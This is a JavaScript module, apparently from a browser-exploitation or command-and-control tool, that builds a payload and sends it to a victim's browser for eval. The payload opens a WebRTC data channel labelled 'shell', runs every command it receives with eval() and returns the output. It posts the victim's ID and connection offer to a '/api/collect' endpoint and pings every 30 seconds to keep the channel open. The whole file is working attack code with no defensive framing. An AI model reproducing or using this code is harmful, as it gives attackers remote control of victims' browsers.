class WebRTCShell {
    
    static init(socket, victim) {
        const config = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        };
        
        const payload = `
            (function() {
                const peerConnection = new RTCPeerConnection(${JSON.stringify(config)});
                const dataChannel = peerConnection.createDataChannel('shell');
                
                dataChannel.onopen = function() {
                    fetch('/api/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            victimId: '${victim.id}',
                            type: 'webrtc_ready',
                            data: {status: 'connected'}
                        })
                    });
                };
                
                dataChannel.onmessage = function(event) {
                    try {
                        const result = eval(event.data);
                        dataChannel.send(JSON.stringify({result: String(result)}));
                    } catch(e) {
                        dataChannel.send(JSON.stringify({error: e.message}));
                    }
                };
                
                peerConnection.createOffer().then(function(offer) {
                    return peerConnection.setLocalDescription(offer);
                }).then(function() {
                    fetch('/api/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            victimId: '${victim.id}',
                            type: 'webrtc_offer',
                            data: peerConnection.localDescription
                        })
                    });
                });
                
                // Keep alive
                setInterval(function() {
                    if(dataChannel.readyState === 'open') {
                        dataChannel.send('ping');
                    }
                }, 30000);
            })();
        `;
        
        socket.emit('eval', payload);
    }
}

module.exports = WebRTCShell;
